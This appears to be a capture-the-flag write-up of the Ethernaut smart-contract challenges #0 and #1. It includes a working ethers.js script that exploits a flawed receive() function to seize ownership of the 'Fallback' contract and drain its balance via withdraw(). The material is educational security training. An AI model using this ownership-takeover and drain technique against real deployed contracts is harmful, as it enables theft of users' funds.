## <u>Day 1: Warmup</u>

#### Ethernaut #0 (hello ethernaut)

To warm up the selection of challanges in Ethernaut, this particular challenge is about triggering a series of methods in a specific order. The order is given by the hints of each read-only methods that the smart contracts suggests to call.

It all starts by calling `info()`, which returns `You will find what you need in info1().`

Once `info1()` is called, it returns `Try info2(), but with "hello" as a parameter.`

Once `info2("hello")` is called, it returns `The property infoNum holds the number of the next info method to call.`

Once `infoNum()` is called, it returns `42`. That gives us the hint to called the next method.

Once `info42()` is called, it returns `theMethodName is the name of the next method.`

Once `theMethodName()` is called, it returns `The method name is method7123949.`

Once `method7123949()` is called, it returns `If you know the password, submit it to authenticate().`

This message could be a bit strange because we don't actually know the password. However, by  carefully inspecting the smart contract, we find a variable named `password`. Let's inspect it:

```solidity
contract HelloEthernaut {
    string public password;
    // ...
    constructor(string memory _password) {
        password = _password;
    }
}
```

Even more, this variable is updated when the smart contract is deployed. Since the variable `password` has the keyword `public`, it means that the getter of the variable `password` has been implicitly defined and we are allow to retrieve it.

Once `password()` is called, we can store that in a variable:

```javascript
var passwordSmartContract = await helloEthernaut.password()
```

By following the last hint obtained, it tells us to submit to the `authenticate()` method.

Let's do that:

```javascript
await helloEthernaut.authenticate(passwordSmartContract);
```

Within the `authenticate` method from the smart contract, we find that if the password pass is the same as the one passed at deployment, the private variable `cleared` is changes from `false` to `true`.

There is specific method within the smart contract that helps us to verify whether this level was cleared or not. Let's call it:

```javascript
console.log("Is Smart Contract cleared?", await helloEthernaut.getCleared())
// true
```

The result from this must be true and that indicated that this level is passed.

#### Ethernaut #1 (fallback)

The key point of this challenge is to become the `owner` of the contract. We should be able to trigger the method `withdraw()`,which is protected by the modifier `onlyOwner`, in order to drain all the funds in this smart contract.

While reviweing we find out that the `receive` method actually changes tha variable `owner` to be equal as the caller of the method. So we need to find a way to trigger it. 

The `receive` method is defined as follows:

```solidity
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
}
```

For this to work, we need to pass the require successfully. That requires that aside from sending an amount of Ether, we need to be in the mapping of `contributions` so that `contributions[msg.sender] > 0` is `true`.

To achieve that, we could make use of another function called `contribute()` which is as follows:

```solidity
function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if (contributions[msg.sender] > contributions[owner]) {
        owner = msg.sender;
    }
}
```

As the `require` states, we need to send at most `0.001 Ether` in order to become part of the mapping `contributions`.

So far, we need to execute a couple methods from this smart contract: `contribute` and the `receive`.

Let's create an script to do just that:

```typescript
const [deployer] = await ethers.getSigners();

const Fallback = await ethers.getContractFactory("Fallback");
const fallback = await Fallback.deploy();
await fallback.deployed();

// calling contribute with 0.0001 Ether < 0.001 Ether
await fallback.contribute({ value: ethers.utils.parseEther("0.0001") });

// calling the receive
await deployer.sendTransaction({
  to: fallback.address,
  value: ethers.utils.parseEther("0.0001"),
})
```

Up until here, we have achieved changing the value of the variable `owner` to be equal to our address.

Now the modifier `onlyOwner` would not impede us to call it since our address has become the `owner` of the smart contract.

```javascript
await fallback.withdraw();
```

By calling withdraw, all the funds of the smart contract have been transferred to the owner, which is our address by now.

Let's check it:

```javascript
console.log("Balance:", await ethers.provider.getBalance(fallback.address));
// Balance: BigNumber { value: "0" }
```

And the balance is 0.
